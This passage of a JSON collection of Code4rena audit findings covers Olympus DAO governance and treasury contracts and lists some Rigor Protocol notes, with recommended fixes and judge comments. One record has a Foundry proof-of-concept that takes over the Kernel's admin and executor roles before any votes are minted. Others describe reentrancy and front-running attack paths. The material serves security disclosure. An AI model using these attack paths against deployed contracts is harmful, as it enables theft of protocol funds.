        "0x1f8b"
      ]
    },
    {
      "id": "3209",
      "title": "[M-05] Proposals overwrite",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x1f8b_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L167><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L66>\n\nIt is possible to overwrite proposals in certain circumstances. The method `Governance.submitProposal` doesn't check if the `proposalId` (stored in a different contract) exists already as a valid proposal in `getProposalMetadata`.\n\n### Proof of Concept\n\nIf the project update the kernel module \"`INSTR`\" and reconfigure proposals and call `INSTR.store(instructions_);`, the counter may return a `proposalId` of an existing proposal and overwrite an existing previous one.\n\nThis is due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.\n\n```javascript\n        uint256 proposalId = INSTR.store(instructions_);\n        getProposalMetadata[proposalId] = ProposalMetadata(\n            title_,\n            msg.sender,\n            block.timestamp,\n            proposalURI_\n        );\n```\n\n### Recommended Mitigation Steps\n\n*   Store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exist.\n\n**[fullyallocated (Olympus) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1234818897):**\n > Agreed with the validity of the circumstance, but it is contingent on us upgrading the contract in an unexpected way. Is the same as saying \"if you upgrade a contract incorrectly it can break the dependencies\". \n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/201#issuecomment-1249566680):**\n > Going to downgrade to medium based on some external requirements needing to be in place to be realized. \n> \n> `\n> Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> Function of the protocol could be impacted and there are external requirements. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in the code of a project called \"2022-08-olympus\". It is possible to overwrite proposals in certain circumstances due to the fact that the proposals are saved in a mapping of a contract that is not related to the one that returns the counters, and furthermore, they do not check that the record already exists.\n\nThe bug can be exploited by updating the kernel module \"`INSTR`\" and reconfiguring proposals and calling `INSTR.store(instructions_);`. This will cause the counter to return a `proposalId` of an existing proposal and overwrite an existing previous one.\n\nThe recommended mitigation step is to store the proposal metadata in the same `INSTR` contract or ensure that the proposal doesn't exists.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/201",
      "tags": [],
      "finders": [
        "0x1f8b"
      ]
    },
    {
      "id": "3208",
      "title": "[M-04] `OlympusGovernance#executeProposal`: reentrancy attack vulnerable function",
      "impact": "MEDIUM",
      "content": "_Submitted by carlitox477, also found by cryptphi and ladboy233_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L265><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L278-L288>\n\nGiven that the activeProposal change is done before the for loop, if this function is call through one `kernel.executeAction(instruction,target)` we can call the same instructions (in the same order) again and again, which may or may not affect funds (depending on the instructions).\n\n### Proof of Concept\n\nFor instance, if we install a new module, and this module has a vulnerability (even intentional), the next steps can by trigger:\n\n1.  Call executeAction\n2.  This allow us to call kernel.executeAction in the for loop\n3.  executAction allow us to call **\\_installModule**\n4.  **\\_installModule** allow us to call **newModule\\_.Init**\n5.  By init we can call now executeProposal again (suppose that the init function interact with a previous vulnerable proxy contract to scam voters to vote in favour of this proposal as if it was a contract which is ok, and before calling executeProposal we change the implementation to allow this attack),\n\n### Recommended Mitigation Steps\n\nUse nonReentrant modifier or move the line `activeProposal = ActivatedProposal(0, 0);` before the for loop.\n\n**[fullyallocated (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/132#issuecomment-1236240839):**\n > I don't know if funds are going to be threatened, but this does allow for a re-entrancy. Warden is correct in resetting the active Proposal before the for loop based on the checks-effects-interactions code design pattern.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of a project hosted on GitHub. The lines of code affected are 265 and 278 to 288. The vulnerability could allow an attacker to call the same instructions multiple times, potentially affecting funds. The proof of concept provided in the report is an example of how an attacker could use the vulnerability to install a vulnerable module and then exploit it. The vulnerability was discovered through static analysis. The recommended mitigation steps are to use a nonReentrant modifier or to move the line of code before the for loop.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/132",
      "tags": [],
      "finders": [
        "cryptphi  ladboy233",
        "carlitox477"
      ]
    },
    {
      "id": "3207",
      "title": "[M-03] RBS may redeploy funds automatically if price stays above or below wall for longer than `_config.regenWait`",
      "impact": "MEDIUM",
      "content": "_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L195-L268><br>\n\nLoss of treasury funds.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L133-L139>\n\n    if (capacity_ < _range.high.threshold && _range.high.active) {\n        // Set wall to inactive\n        _range.high.active = false;\n        _range.high.lastActive = uint48(block.timestamp);\n\n\n        emit WallDown(true, block.timestamp, capacity_);\n    }\n\n\\_range.high.lastActive and \\_range.low\\.lastActive are only updated in RANGE.sol when \\_range.x.capacity < \\_range.x.threshold and the \\_range.x.active == true. After this is tripped, \\_range.x.active will be set to false, meaning that \\_range.x.lastActive will not be updated again until the wall is regenerated and capacity is restored.\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L209-L214>\n\n        if (\n            uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) &&\n            _status.high.count >= config_.regenThreshold\n        ) {\n            _regenerate(true);\n        }\n\nIf 1) the price were to sustain outside of the range (high volatility for volatile asset, black swan for stable) for longer than config\\_.regenWait and 2) config_regenThreshold satisfies the following equation:\n\n    config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency\n\nthen *status.high.count could be greater than config*.regenThreshold. This would trigger more funds to be deployed even though the price never came back inside the wall price.\n\nIn this scenario the wall price would be far from the true price of the asset leading to loss of treasury funds as it buys/sell at prices well above/below market price.\n\n### Recommended Mitigation Steps\n\nA check should be added to verify that the price is within the wall price before regenerating. Alternatively, config\\_.regenTheshold could be set to satisfy the following equation:\n\n    config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency\n\nThis would eliminate the risk as \\_status.high.count >= config\\_.regenThreshold could never be true for a sustained period where current price is greater than the wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1235838436):**\n > This is valid. Our intended parameterization of the system would not be subject to this vulnerability, but it would be an issue if the system was incorrectly parameterized. Because it is an edge case, I'm not sure it is a high risk bug though.\n>\n > Another potential fix is resetting the `count` to 0 and the `observations` array to `new bool[](regenObserve)` to clear out positive values from when a wall goes down. This could be done in the `_updateCapacity()` function by checking if the new capacity is under the threshold.\n\n**[0xean (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/118#issuecomment-1252356234):**\n > Going to downgrade to Medium as the external dependency is a configuration that is not planned to be used by the sponsor. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code that could lead to loss of treasury funds. The bug is triggered when the price of the asset is outside the range (high volatility for volatile asset, black swan for stable) for longer than config_.regenWait and config_regenThreshold satisfies the equation config_.regenThreshold <= _config.regenObserve - config_.regenWait / frequency. This would cause the wall price to be far from the true price of the asset leading to loss of treasury funds as it buys/sells at prices well above/below market price. \n\nTo mitigate the risk, a check should be added to verify that the price is within the wall price before regenerating. Alternatively, config_.regenTheshold could be set to satisfy the equation config_.regenThreshold > _config.regenObserve - config_.regenWait / frequency. This would eliminate the risk as _status.high.count >= config_.regenThreshold could never be true for a sustained period where the current price is greater than the wall price.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/118",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3206",
      "title": "[M-02] Solmate `safetransfer` and `safetransferfrom` does not check the codesize of the token address, which may lead to fund loss",
      "impact": "MEDIUM",
      "content": "_Submitted by djxploit, also found by brgltd_\n\nIn `getloan()` and `replayloan()`, the `safetransfer` and `safetransferfrom` doesn't check the existence of code at the token address. This is a known issue while using solmate's libraries.<br>\nHence this may lead to miscalculation of funds and may lead to loss of funds , because if `safetransfer()` and `safetransferfrom()` are called on a token address that doesn't have contract in it, it will always return success, bypassing the return value check. Due to this protocol will think that funds has been transferred and successful , and records will be accordingly calculated, but in reality funds were never transferred.<br>\nSo this will lead to miscalculation and possibly loss of funds\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L110><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L99>\n\n### Recommended Mitigation Steps\n\nUse openzeppelin's safeERC20 or implement a code existence check.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/117#issuecomment-1240019949):**\n > Confirmed. Will implement this. Thank you.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the project 2022-08-olympus. The vulnerability is in the getloan() and replayloan() functions of the TRSRY.sol file, located at lines 110 and 99 respectively. The issue is that the safetransfer and safetransferfrom functions do not check the existence of code at the token address. This could lead to miscalculation of funds and possibly loss of funds, as the protocol will think that funds have been transferred and successful, when in reality they have not. The proof of concept is the code at the two lines mentioned above. The vulnerability was found through manual code review. The recommended mitigation step is to use openzeppelin's safeERC20 or to implement a code existence check.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/117",
      "tags": [],
      "finders": [
        "brgltd",
        "djxploit"
      ]
    },
    {
      "id": "3205",
      "title": "[M-01] `Operator::setReserveFactor` doesn't check if bond market should be changed",
      "impact": "MEDIUM",
      "content": "_Submitted by rvierdiiev_\n\n`Operator::setReserveFactor` sets new `reserveFactor` value. This parameter is used in `fullCapacity` function to calculate how much capacity is available by high/low side. Then calculated capacity is used by `Range` module inside `regenerate` function to set the threshold of capacity for both sides of market. Then in `Range::updateCapacity` function this threshold is checked to understand if the wall should be down and the bond market should be closed.\n\nChanging this value means that the capacity of sides has changed and the sides should be regenarated to include this changes.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L548><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L711><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L133><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L145><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L185><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L780><br>\n\n### Recommended Mitigation Steps\n\nCall this after the param updating.<br>\n`_regenerate(true); _regenerate(false;`\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1241054503):**\n > Forcing a regeneration when the reserveFactor is updated could cause unintended regeneration if a wall is currently down. A better approach may be to conditionally regenerate each side if they are active.\n\n**[Oighty (Olympus) acknowledged and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/83#issuecomment-1244128646):**\n > After discussing with the team more, we are going to leave this as-is. It is more flexible to not regenerate the side in this function. With the current implementation, the guardian can determine if the change should go into effect on the next regen, or if it should happen immediately. To enable immediately, they can manually call `regenerate`.\n\n\n\n***\n\n",
      "summary": "\nA bug has been reported in the code of the 2022-08-olympus project on Github. This bug affects the capacity of the market and can cause the bond market to close. The bug is located in the Operator.sol and RANGE.sol files, and the lines of code are listed in the report. \n\nThe impact of the bug is that when the `reserveFactor` value is changed, the sides of the market should be regenerated to include the changes. To fix this bug, the code should call the `_regenerate` function after the parameter has been updated. \n\nThis bug should be addressed as soon as possible to prevent any issues with the market capacity.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/83",
      "tags": [],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "3204",
      "title": "[H-03] TRSRY: front-runnable `setApprovalFor`",
      "impact": "HIGH",
      "content": "_Submitted by zzzitron, also found by berndartmueller, csanuragjain, pashov, Ruhum, sorrynotsorry, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48>\n\nAn attacker may be able to withdraw more than intended\n\n### Proof of Concept\n\nLet's say Alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.\n\n```solidity\n// modules/TRSRY.sol\n\n 63     /// @notice Sets approval for specific withdrawer addresses\n 64     function setApprovalFor(\n 65         address withdrawer_,\n 66         ERC20 token_,\n 67         uint256 amount_\n 68     ) external permissioned {\n 69         withdrawApproval[withdrawer_][token_] = amount_;\n 70\n 71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);\n 72     }\n```\n\nThe `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval.\n\n```solidity\n 41\n 42     function grantApproval(\n 43         address for_,\n 44         ERC20 token_,\n 45         uint256 amount_\n 46     ) external onlyRole(\"custodian\") {\n 47         TRSRY.setApprovalFor(for_, token_, amount_);\n 48     }\n```\n\n### Recommended Mitigation Steps\n\nInstead of setting the given amount, one can reduce from the current approval. By doing so, it checks whether the previous approval is spend.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1238901986):**\n > Understood. Will change the logic to increase/decrease allowances.\n\n**[0xean (judge) increased severity to High and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1249816020):**\n > I think this vulnerability should be a high severity as it opens up the possibility of a direct loss of funds in the amount of up to the previous approval amount. Upgrading to High. \n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1250385243):**\n > @ind-igo - Not sure if you deleted your comment, but that context is useful.  Happy to take another look here. \n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/410#issuecomment-1251369022):**\n > I did, I just thought it was unnecessary to evaluate the issue. I was just saying that the context of the code is that it is not intended to be used to approve an EOA/multisig, but instead used to approve governance-voted contracts to access treasury funds, in order to deposit into yield contracts or whatever. But I don't think it's very relevant to this, as the code is still faulty and exploitable in an extreme case. I already have made this remediation as well, so all good.\n\n\n\n***\n\n \n",
      "summary": "\nThis bug report is about an issue found in two lines of code in two different files. The issue is that an attacker may be able to withdraw more than the intended amount from the treasury due to a vulnerability in the code. The proof of concept for this vulnerability is that if the treasury custodian reduces the approval to a certain amount, the attacker could frontrun the `setApprovalFor` of that amount and withdraw more than the intended amount. No tools were used in the report. The recommended mitigation steps are that instead of setting the given amount, one should reduce from the current approval in order to check whether the previous approval is spend.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/410",
      "tags": [],
      "finders": [
        "csanuragjain",
        "Trust",
        "pashov",
        "sorrynotsorry",
        "Ruhum",
        "berndartmueller",
        "zzzitron"
      ]
    },
    {
      "id": "3203",
      "title": "[H-02] Anyone can pass any proposal alone before first `VOTES` are minted",
      "impact": "HIGH",
      "content": "_Submitted by Bahurum, also found by bin2chen and cryptphi_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-L218><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268>\n\nBefore any `VOTES` are minted anyone can activate and execute an arbitrary proposal even with 0 votes cast. So an attacker can pass any proposal (i.e. change the `executor` + `admin` of the `Kernel`, gaining access to all permissioned functions and to funds held).\n\n### Proof of Concept\n\nChecks on vote numbers made in `Governance.sol` at lines [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164), [217-218](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L217-218), [268](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268) pass if `VOTES.totalSupply() == 0`. So, until no `VOTES` are minted, anyone can submit, activate and execute a proposal. There is no need to own or cast votes. This happens if `OlympusGovernance` is granted the `executor` role before any `VOTES` are minted (as in [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol)). The attacker can anticipate/frontrun the minting and pass a proposal to change both the `Kernel` `admin` and `executor`. Then he/she can upgrade malicious modules, steal funds from treasury...\n\nA PoC was obtained modifying the `setUp()` of [Governance.t.sol](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol) by keeping only what is before the minting of `VOTES` (up to [L83](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/test/policies/Governance.t.sol#L83) included). The test is as follows:\n\n```solidity\n    function test_AttackerPassesProposalBeforeMinting() public {\n\n        address[] memory users = userCreator.create(1);\n        address attacker = users[0];\n        vm.prank(attacker);\n        MockMalicious attackerControlledContract = new MockMalicious();\n\n        Instruction[] memory instructions_ = new Instruction[](2);\n        instructions_[0] = Instruction(Actions.ChangeAdmin, address(attackerControlledContract));\n        instructions_[1] = Instruction(Actions.ChangeExecutor, address(attackerControlledContract));\n\n        vm.prank(attacker);\n        governance.submitProposal(instructions_, \"proposalName\", \"This is the proposal URI\");\n        \n        governance.endorseProposal(1);\n        \n        vm.prank(attacker);\n        governance.activateProposal(1);\n        \n        vm.warp(block.timestamp + 3 days + 1);\n        \n        governance.executeProposal();\n\n        assert(kernel.executor()==address(attackerControlledContract));\n        assert(kernel.admin()==address(attackerControlledContract));\n\n\n    }\n```\n\nwith\n\n```solidity\ncontract MockMalicious {}\n\n```\n\n### Recommended Mitigation Steps\n\nIn `Governance.sol` check for a minimum VOTES totalSupply, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line [L164](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L164).\n\n**[fullyallocated (Olympus) acknowledged](https://github.com/code-423n4/2022-08-olympus-findings/issues/392)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/392#issuecomment-1249926401):**\n > Leaving as High severity as this shows a clear path to loss of funds.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the code of the Governance.sol file of the 2022-08-olympus repository on Github. This vulnerability allows anyone to activate and execute a proposal with 0 votes cast, which means an attacker can pass any proposal (i.e. change the 'executor' + 'admin' of the 'Kernel', gaining access to all permissioned functions and to funds held).\n\nThe checks on vote numbers made in Governance.sol at lines L164, 217-218, and 268 pass if VOTES.totalSupply() == 0. This means that until no VOTES are minted, anyone can submit, activate and execute a proposal. A proof of concept was obtained by modifying the setUp() of Governance.t.sol and keeping only what is before the minting of VOTES.\n\nThe recommended mitigation step for this vulnerability is to check for a minimum VOTES totalSupply in Governance.sol, similiar to the expected initial supply of VOTES when they have been fairly distributed, for example at line L164.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/392",
      "tags": [],
      "finders": [
        "bin2chen  cryptphi",
        "Bahurum"
      ]
    },
    {
      "id": "3202",
      "title": "[H-01] In `Governance.sol`, it might be impossible to activate a new proposal forever after failed to execute the previous active proposal.",
      "impact": "HIGH",
      "content": "_Submitted by hansfriese, also found by berndartmueller, csanuragjain, m9800, V&#95;B, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L302-L304>\n\nCurrently, if users vote for the active proposal, the `VOTES` are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active.\n\nAnd the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after `GRACE_PERIOD`.\n\nBut `activateProposal()` requires at least 20% endorsements [here](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221), so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.\n\n### Proof of Concept\n\nThe below scenario would be possible.\n\n1.  `Proposal 1` was submitted and activated successfully.\n2.  Let's assume 81% of the total votes voted for this proposal. `Yes = 47%`, `No = 34%`\n3.  This proposal can't be executed for [this requirement](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L268-L270) because `47% - 34% = 13% < 33%`.\n4.  Currently the contract contains more than 81% of total votes and users have at most 19% in total.\n5.  Also users can't reclaim their votes among 81% while `Proposal 1` is active.\n6.  So even if a user who has 1% votes submits a new proposal, it's impossible to activate because of this [require()](https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L216-L221).\n7.  So it's impossible to delete `Proposal 1` from an active proposal and there won't be other active proposal forever.\n\n### Tools Used\n\nSolidity Visual Developer of VSCode\n\n### Recommended Mitigation Steps\n\nI think we should add one more constant like `EXECUTION_EXPIRE = 2 weeks` so that voters can reclaim their votes after this period even if the proposal is active.\n\nI am not sure we can use the current `GRACE_PERIOD` for that purpose.\n\nSo `reclaimVotes()` should be modified like below.\n\n    function reclaimVotes(uint256 proposalId_) external {\n        uint256 userVotes = userVotesForProposal[proposalId_][msg.sender];\n\n        if (userVotes == 0) {\n            revert CannotReclaimZeroVotes();\n        }\n\n        if (proposalId_ == activeProposal.proposalId) {\n            if (block.timestamp < activeProposal.activationTimestamp + EXECUTION_EXPIRE) //+++++++++++++++++++++++++++++++++\n            {\n                revert CannotReclaimTokensForActiveVote();\n            }\n        }\n\n        if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {\n            revert VotingTokensAlreadyReclaimed();\n        }\n\n        tokenClaimsForProposal[proposalId_][msg.sender] = true;\n\n        VOTES.transferFrom(address(this), msg.sender, userVotes);\n    }\n\n**[fullyallocated (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/376)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the 'Governance.sol' file of the 2022-08-olympus project. This vulnerability affects the ability of users to vote for proposals. Currently, if users vote for the active proposal, the 'VOTES' are transferred to the contract so that users can't vote or endorse other proposals while the voted proposal is active. This means that the active proposal can be replaced only when the proposal is executed successfully or another proposal is activated after the 'GRACE_PERIOD'. However, 'activateProposal()' requires at least 20% endorsements, so it might be impossible to activate a new proposal forever if the current active proposal involves more than 80% of total votes.\n\nTo demonstrate this vulnerability, the bug report provides a proof of concept scenario. In this scenario, a proposal is submitted and activated successfully, but it doesn't meet the execution requirements. This means that the proposal can't be executed, but it can't be replaced either since it involves more than 80% of total votes. This means that the proposal will remain active forever, and no other proposal can be activated.\n\nThe bug report suggests a mitigation step to address this vulnerability. This involves adding a new constant called 'EXECUTION_EXPIRE' so that voters can reclaim their votes after a certain period, even if the proposal is active. This would allow users to reclaim their votes and submit new proposals. The 'reclaimVotes()' function should be modified to incorporate this new constant.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/376",
      "tags": [],
      "finders": [
        "csanuragjain",
        "berndartmueller",
        "zzzitron",
        "m9800",
        "hansfriese",
        "V_B"
      ]
    },
    {
      "id": "24234",
      "title": "[16]",
      "impact": "LOW",
      "content": "`checkPrecision` does not take the number of decimals into account. For USDC with 6 decimals means rounding to 0.1 pennies, whereas the precision is much higher (probably too high, which you want to avoid) for DAI with 18 decimals.\n\n**[Jack the Pug (judge) commented](https://github.com/code-423n4/2022-08-rigor-findings/issues/73#issuecomment-1229372216):**\n > One of the best QA reports! Pure good findings found by keen human eyes. Good job!\n\n**parv3213 (Rigor) commented:**\n > [01] seems invalid as community id starts from 1. Community id 0 is always invalid.\n\n**Jack the Pug (judge) commented:**\n > Re: [01], I believe the issue is a valid low-severity issue, while it's true that REAL community id starts from 1, it still can not prevent the caller to use 0 as the community id and the unexpected behavior will happen if they do so, as described in the QA report. I don't think this requires a fix though, it's a minor issue indeed.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24233",
      "title": "[15]",
      "impact": "LOW",
      "content": "`recoverTokens` has a hardcoded 3 [Project.sol#L369](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L369) instead of using the enum value, which can lead to problems when updating the possible enum values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24232",
      "title": "[14]",
      "impact": "LOW",
      "content": "`initiateHomeFi` is documented with \"Can only be called by HomeFiProxy owner\", but this is not true. The function is callable by anyone and sets the owner.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24231",
      "title": "[13]",
      "impact": "LOW",
      "content": "There is no upper limit for the lender fee [HomeFi.sol#L194](https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/HomeFi.sol#L194). Consider enforcing a limit of 1,000 (or even something like 200) to avoid errors and give users an upper limit for the fee.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24230",
      "title": "[12]",
      "impact": "LOW",
      "content": "The number of currencies (3) is hard-coded in different places, consider storing this information in arrays, which enables easy additions of new ones.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24229",
      "title": "[11]",
      "impact": "LOW",
      "content": "`SignatureDecoder.recoverKey` does not support [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271), meaning there is no support for smart contracts in all places that use signatures (which are many), which hinders different applications (e.g., building on top of the protocol).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Rigor Protocol",
      "source_link": "https://code4rena.com/reports/2022-08-rigor",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "24228",
      "title": "[10]",
      "impact": "LOW",
